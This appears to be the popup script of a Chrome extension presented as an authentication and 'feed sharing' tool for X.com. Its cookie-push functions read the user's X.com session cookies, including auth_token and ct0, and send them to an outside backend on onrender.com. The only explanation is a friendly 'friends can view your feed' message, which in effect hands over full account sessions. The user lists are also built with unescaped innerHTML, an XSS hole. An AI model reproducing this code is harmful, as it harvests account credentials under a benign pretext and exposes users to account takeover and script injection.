// Chrome Extension Authentication System
// Main popup functionality

class AuthExtension {
    constructor() {
        this.apiUrl = 'https://backend-0s46.onrender.com'; // Default API URL
        this.token = null;
        this.init();
    }

    async init() {
        console.log('Initializing Auth Extension...');

        // Load saved configuration
        await this.loadConfig();

        // Check if user is already logged in
        await this.checkAuthStatus();

        // Set up event listeners
        this.setupEventListeners();
    }

    async loadConfig() {
        try {
            const result = await chrome.storage.sync.get(['apiUrl']);
            if (result.apiUrl) {
                this.apiUrl = result.apiUrl;
                document.getElementById('api-url').value = this.apiUrl;
            }
        } catch (error) {
            console.error('Failed to load config:', error);
        }
    }

    // async saveConfig() {
    //     const apiUrl = document.getElementById('api-url').value.trim();
    //     if (apiUrl) {
    //         this.apiUrl = apiUrl;
    //         try {
    //             await chrome.storage.sync.set({ apiUrl: this.apiUrl });
    //             this.showSuccess('Configuration saved successfully!');
    //         } catch (error) {
    //             console.error('Failed to save config:', error);
    //             this.showError('Failed to save configuration');
    //         }
    //     }
    // }

    async checkAuthStatus() {
        try {
            // Get stored token
            const result = await chrome.storage.local.get(['authToken']);
            if (result.authToken) {
                this.token = result.authToken;

                // Verify token with server
                const isValid = await this.verifyToken();
                if (isValid) {
                    await this.loadUserProfile();
                    this.showDashboard();
                } else {
                    // Token is invalid, remove it
                    await this.clearToken();
                    this.showAuthForms();
                }
            } else {
                this.showAuthForms();
            }
        } catch (error) {
            console.error('Auth check failed:', error);
            this.showAuthForms();
        }
    }

    async verifyToken() {
        try {
            const response = await fetch(`${this.apiUrl}/api/verify`, {
                method: 'GET',
                headers: {
                    'Authorization': `Bearer ${this.token}`,
                    'Content-Type': 'application/json'
                }
            });

            if (response.ok) {
                const data = await response.json();
                return data.valid;
            }
            return false;
        } catch (error) {
            console.error('Token verification failed:', error);
            return false;
        }
    }

    async loadUserProfile() {
        try {
            const response = await fetch(`${this.apiUrl}/api/user/profile`, {
                method: 'GET',
                headers: {
                    'Authorization': `Bearer ${this.token}`,
                    'Content-Type': 'application/json'
                }
            });

            if (response.ok) {
                const userData = await response.json();
                this.displayUserInfo(userData);
            } else {
                throw new Error('Failed to load profile');
            }
        } catch (error) {
            console.error('Failed to load user profile:', error);
            this.showError('Failed to load user profile');
        }
    }

    displayUserInfo(userData) {
        document.getElementById('username-display').textContent = userData.username;
        document.getElementById('email-display').textContent = userData.email;

        // Format creation date
        const createdDate = new Date(userData.created_at).toLocaleDateString();
        document.getElementById('created-display').textContent = createdDate;
    }

    setupEventListeners() {
        // Form submissions
        document.getElementById('loginForm').addEventListener('submit', (e) => this.handleLogin(e));
        document.getElementById('registerForm').addEventListener('submit', (e) => this.handleRegister(e));

        // Form toggles
        document.getElementById('show-register').addEventListener('click', (e) => {
            e.preventDefault();
            this.showRegisterForm();
        });

        document.getElementById('show-login').addEventListener('click', (e) => {
            e.preventDefault();
            this.showLoginForm();
        });

        // Dashboard actions
        document.getElementById('logout-btn').addEventListener('click', () => this.handleLogout());
        // document.getElementById('refresh-profile').addEventListener('click', () => this.loadUserProfile());

        // Configuration
        // document.getElementById('save-config').addEventListener('click', () => this.saveConfig());

        // Message close buttons
        document.getElementById('close-error').addEventListener('click', () => this.hideError());
        document.getElementById('close-success').addEventListener('click', () => this.hideSuccess());

        // Add these new listeners
        document.getElementById('delete-account-btn').addEventListener('click', () => this.showDeleteConfirmation());
        document.getElementById('confirm-delete-btn').addEventListener('click', () => this.handleDeleteAccount());
        document.getElementById('cancel-delete-btn').addEventListener('click', () => this.hideDeleteConfirmation());

        //user cookies push
        document.getElementById('fetch-cookies-btn').addEventListener('click', () => this.checkAndSendCookies());


        document.getElementById('share-feed-btn').addEventListener('click', () => this.handleShareFeed());
        document.getElementById('share-username').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                this.handleShareFeed();
            }
        });

        document.getElementById('shared-users-list').addEventListener('click', (e) => {
            if (e.target.classList.contains('btn-remove')) {
                const username = e.target.getAttribute('data-username');
                this.handleUnshareFeeds(username);
            }
        });

        document.getElementById('fetch-users-list').addEventListener('click', (e) => {
            const username = e.target.getAttribute('data-username');
            if (e.target.classList.contains('btn-load')) {
                this.handleLoadFeed(username);
            } else if (e.target.classList.contains('btn-restore')) {
                this.handleRestoreFeed(username);
            }
        });

    }

    async handleLogin(event) {
        event.preventDefault();

        const username = document.getElementById('login-username').value.trim();
        const password = document.getElementById('login-password').value;

        if (!username || !password) {
            this.showError('Please fill in all fields');
            return;
        }

        this.showLoading(true);

        try {
            const response = await fetch(`${this.apiUrl}/api/login`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ username, password })
            });

            const data = await response.json();

            if (response.ok) {
                this.token = data.token;
                await chrome.storage.local.set({ authToken: this.token });

                this.showSuccess('Login successful!');
                setTimeout(() => {
                    this.loadUserProfile();
                    this.showDashboard();
                }, 1000);
            } else {
                this.showError(data.error || 'Login failed');
            }
        } catch (error) {
            console.error('Login error:', error);
            this.showError('Network error. Please check your connection and API URL.');
        } finally {
            this.showLoading(false);
        }
    }

    async handleRegister(event) {
        event.preventDefault();

        const username = document.getElementById('register-username').value.trim();
        const email = document.getElementById('register-email').value.trim();
        const password = document.getElementById('register-password').value;
        const confirmPassword = document.getElementById('register-confirm-password').value;

        if (!username || !email || !password || !confirmPassword) {
            this.showError('Please fill in all fields');
            return;
        }

        if (password !== confirmPassword) {
            this.showError('Passwords do not match');
            return;
        }

        if (password.length < 6) {
            this.showError('Password must be at least 6 characters long');
            return;
        }

        this.showLoading(true);

        try {
            const response = await fetch(`${this.apiUrl}/api/register`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ username, email, password })
            });

            const data = await response.json();

            if (response.ok) {
                this.token = data.token;
                await chrome.storage.local.set({ authToken: this.token });

                this.showSuccess('Registration successful!');
                setTimeout(() => {
                    this.loadUserProfile();
                    this.showDashboard();
                }, 1000);
            } else {
                this.showError(data.error || 'Registration failed');
            }
        } catch (error) {
            console.error('Registration error:', error);
            this.showError('Network error. Please check your connection and API URL.');
        } finally {
            this.showLoading(false);
        }
    }

    async handleLogout() {
        try {
            // Call logout endpoint (optional)
            if (this.token) {
                await fetch(`${this.apiUrl}/api/logout`, {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${this.token}`,
                        'Content-Type': 'application/json'
                    }
                });
            }
        } catch (error) {
            console.error('Logout API call failed:', error);
        }

        // Clear local storage regardless of API call result
        await this.clearToken();
        this.showSuccess('Logged out successfully!');

        setTimeout(() => {
            this.showAuthForms();
            this.clearForms();
        }, 1000);
    }

    async clearToken() {
        this.token = null;
        await chrome.storage.local.remove(['authToken']);
    }

    //delete my account
    async handleDeleteAccount() {
        const password = document.getElementById('delete-password').value;
        
        if (!password) {
            document.getElementById('delete-error').textContent = 'Please enter your password';
            return;
        }

        this.showLoading(true);
        document.getElementById('delete-error').textContent = '';

        try {
            const response = await fetch(`${this.apiUrl}/api/user/delete`, {
                method: 'DELETE',
                headers: {
                    'Authorization': `Bearer ${this.token}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ password })
            });

            const data = await response.json();

            if (response.ok) {
                this.showSuccess('Account deleted successfully');
                await this.clearToken();
                setTimeout(() => {
                    this.showAuthForms();
                    this.clearForms();
                    this.hideDeleteConfirmation();
                }, 1500);
            } else {
                document.getElementById('delete-error').textContent = data.error || 'Account deletion failed';
            }
        } catch (error) {
            console.error('Delete account error:', error);
            document.getElementById('delete-error').textContent = 'Network error during deletion';
        } finally {
            this.showLoading(false);
        }
    }

    //pushing cookies
    async extractXCookiesIfLoggedIn() {
        try {
            // Get cookies from X.com domain
            const cookies = await chrome.cookies.getAll({ domain: '.x.com' });

            if (!cookies || cookies.length === 0) {
                this.showError('Ensure You are logged in to X.com');
                return null;
            }

            // Filter and format the cookies we want
            const importantCookies = {};
            const cookieNames = ['guest_id', 'auth_token', 'twid', 'ct0'];

            cookies.forEach(cookie => {
                if (cookieNames.includes(cookie.name)) {
                    importantCookies[cookie.name] = cookie.value;
                }
            });

            // Check if user is actually logged in by verifying presence of auth cookies
            // auth_token and ct0 are required for authenticated requests to X.com
            if (!importantCookies.auth_token || !importantCookies.ct0) {
                this.showError('User is not logged in to X.com - missing authentication cookies');
                return null;
            }

            console.log('User is logged in to X.com - authentication cookies found');
            return importantCookies;
        } catch (error) {
            console.error('Failed to extract cookies:', error);
            this.showError('Failed to extract cookies');
            return null;
        }
    }
    
    async checkAndSendCookies() {
        const cookies = await this.extractXCookiesIfLoggedIn();

        if (cookies) {
            // User is logged in, proceed to send cookies
            return await this.sendCookiesToBackend(cookies);
        } else {
            // User is not logged in, don't send anything
            console.log('Skipping cookie push - user is not logged in to X.com');
            return false;
        }
    }
    
    async sendCookiesToBackend(cookies) {
        if (!this.token) {
            this.showError('You must be logged in to share feed');
            return false;
        }

        this.showLoading(true);

        try {
            const response = await fetch(`${this.apiUrl}/api/save-cookies`, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${this.token}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ cookies })
            });

            if (response.ok) {
                this.showSuccess('Now Your Friends can view your feed');
                return true;
            } else {
                const data = await response.json();
                this.showError(data.error || 'Failed');
                return false;
            }
        } catch (error) {
            console.error('Failed to push cookies:', error);
            this.showError('Network error while sharing');
            return false;
        } finally {
            this.showLoading(false);
        }
    }

    //friend feature
    async handleShareFeed() {
        const username = document.getElementById('share-username').value.trim();
        
        if (!username) {
            this.showError('Please enter a username');
            return;
        }
        
        if (!this.token) {
            this.showError('You must be logged in to share your feed');
            return;
        }
        
        this.showLoading(true);
        
        try {
            const response = await fetch(`${this.apiUrl}/api/share-feed`, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${this.token}`,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ share_with: username })
            });
            
            const data = await response.json();
            
            if (response.ok) {
                this.showSuccess(data.message);
                document.getElementById('share-username').value = ''; // Clear the input
                this.loadSharedUsers(); // Refresh the shared users list
                this.loadFetchUsers(); // Refresh the fetch users list
            } else {
                this.showError(data.error || 'Failed to share feed');
            }
        } catch (error) {
            console.error('Share feed error:', error);
            this.showError('Network error while sharing feed');
        } finally {
            this.showLoading(false);
        }
    }

    async handleUnshareFeeds(username) {
        if (!this.token) {
            this.showError('You must be logged in to remove feed access');
            return;
        }
        
        if (!confirm(`Are you sure you want to remove ${username}'s access to your feed?`)) {
            return;
        }
        
        this.showLoading(true);
        
        try {
            const response = await fetch(`${this.apiUrl}/api/unshare-feed/${encodeURIComponent(username)}`, {
                method: 'DELETE',
                headers: {
                    'Authorization': `Bearer ${this.token}`,
                    'Content-Type': 'application/json'
                }
            });
            
            const data = await response.json();
            
            if (response.ok) {
                this.showSuccess(data.message);
                this.loadSharedUsers(); // Refresh the shared users list
                this.loadFetchUsers(); // Refresh the fetch users list
            } else {
                this.showError(data.error || 'Failed to remove access');
            }
        } catch (error) {
            console.error('Unshare feed error:', error);
            this.showError('Network error while removing access');
        } finally {
            this.showLoading(false);
        }
    }

    async loadSharedUsers() {
        if (!this.token) {
            return;
        }
        
        try {
            const response = await fetch(`${this.apiUrl}/api/shared-users`, {
                method: 'GET',
                headers: {
                    'Authorization': `Bearer ${this.token}`,
                    'Content-Type': 'application/json'
                }
            });
            
            if (response.ok) {
                const users = await response.json();
                this.displaySharedUsers(users);
            } else {
                console.error('Failed to load shared users');
            }
        } catch (error) {
            console.error('Error loading shared users:', error);
        }
    }

    async loadFetchUsers() {
        if (!this.token) {
            return;
        }
        
        try {
            const response = await fetch(`${this.apiUrl}/api/fetch-users`, {
                method: 'GET',
                headers: {
                    'Authorization': `Bearer ${this.token}`,
                    'Content-Type': 'application/json'
                }
            });
            
            if (response.ok) {
                const users = await response.json();
                this.displayFetchUsers(users);
            } else {
                console.error('Failed to load fetch users');
            }
        } catch (error) {
            console.error('Error loading fetch users:', error);
        }
    }

    //load friend's feed
    async handleLoadFeed(username) {
        this.showLoading(true);
        try {
            const response = await fetch(`${this.apiUrl}/api/fetch-feed/${encodeURIComponent(username)}`, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${this.token}`,
                'Content-Type': 'application/json'
            }
            });
            const data = await response.json();
            if (!response.ok) throw new Error(data.error || 'Failed to load feed');

            // Send tweets to content script for injection
            chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
            chrome.tabs.sendMessage(tabs[0].id, {
                type: 'loadFeed',
                tweets: data.tweets,
                source: data.source_user
            });
            });
            this.showSuccess(`Loaded ${data.count} tweets from ${username}`);  
        } catch (err) {
            this.showError(err.message);
        } finally {
            this.showLoading(false);
        }
    }

    handleRestoreFeed(username) {
        chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
            chrome.tabs.sendMessage(tabs[0].id, {
            type: 'restoreFeed',
            disable: true
            });
        });
        this.showSuccess(`Restore feed requested for ${username}`);
    }


    // UI Helper Methods
    showLoading(show) {
        const loadingElement = document.getElementById('loading');
        const authSection = document.getElementById('auth-section');
        const dashboard = document.getElementById('dashboard');

        if (show) {
            loadingElement.classList.remove('hidden');
            authSection.classList.add('hidden');
            dashboard.classList.add('hidden');
        } else {
            loadingElement.classList.add('hidden');
        }
    }

    showAuthForms() {
        document.getElementById('auth-section').classList.remove('hidden');
        document.getElementById('dashboard').classList.add('hidden');
        document.getElementById('loading').classList.add('hidden');
    }

    showDashboard() {
        document.getElementById('dashboard').classList.remove('hidden');
        document.getElementById('auth-section').classList.add('hidden');
        document.getElementById('loading').classList.add('hidden');
        
        // Load shared users and fetch users when dashboard is shown
        this.loadSharedUsers();
        this.loadFetchUsers();
    }


    showLoginForm() {
        document.getElementById('login-form').classList.remove('hidden');
        document.getElementById('register-form').classList.add('hidden');
    }

    showRegisterForm() {
        document.getElementById('register-form').classList.remove('hidden');
        document.getElementById('login-form').classList.add('hidden');
    }

    showError(message) {
        document.getElementById('error-text').textContent = message;
        document.getElementById('error-message').classList.remove('hidden');

        // Auto-hide after 5 seconds
        setTimeout(() => this.hideError(), 5000);
    }

    hideError() {
        document.getElementById('error-message').classList.add('hidden');
    }

    showSuccess(message) {
        document.getElementById('success-text').textContent = message;
        document.getElementById('success-message').classList.remove('hidden');

        // Auto-hide after 3 seconds
        setTimeout(() => this.hideSuccess(), 3000);
    }

    hideSuccess() {
        document.getElementById('success-message').classList.add('hidden');
    }

    showDeleteConfirmation() {
        document.getElementById('delete-confirm').classList.remove('hidden');
        document.getElementById('delete-account-btn').classList.add('hidden');
        document.getElementById('delete-error').textContent = '';
        document.getElementById('delete-password').value = '';
    }

    hideDeleteConfirmation() {
        document.getElementById('delete-confirm').classList.add('hidden');
        document.getElementById('delete-account-btn').classList.remove('hidden');
    }

    clearForms() {
        // Clear login form
        document.getElementById('login-username').value = '';
        document.getElementById('login-password').value = '';

        // Clear register form
        document.getElementById('register-username').value = '';
        document.getElementById('register-email').value = '';
        document.getElementById('register-password').value = '';
        document.getElementById('register-confirm-password').value = '';

        // Show login form by default
        this.showLoginForm();
    }

    displaySharedUsers(users) {
        const listContainer = document.getElementById('shared-users-list');
        
        if (users.length === 0) {
            listContainer.innerHTML = '<p class="no-shares">No Viewers</p>';
            return;
        }
        
        listContainer.innerHTML = users.map(user => `
            <div class="shared-user-item">
                <span class="shared-user-name">${user.username}</span>
                <button class="btn-remove" data-username="${user.username}">
                    Remove
                </button>
            </div>
        `).join('');
    }

    displayFetchUsers(users) {
        const list = document.getElementById('fetch-users-list');
        if (users.length === 0) {
            list.innerHTML = '<p class="no-fetches">None Access</p>';
            return;
        }
        list.innerHTML = users.map(user => `
            <div class="user-entry">
                <span>${user.username}</span>
                <button class="btn-load" data-username="${user.username}">Load Feed</button>
            </div>
        `).join('');
    }

}

// Initialize the extension when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    new AuthExtension();
});
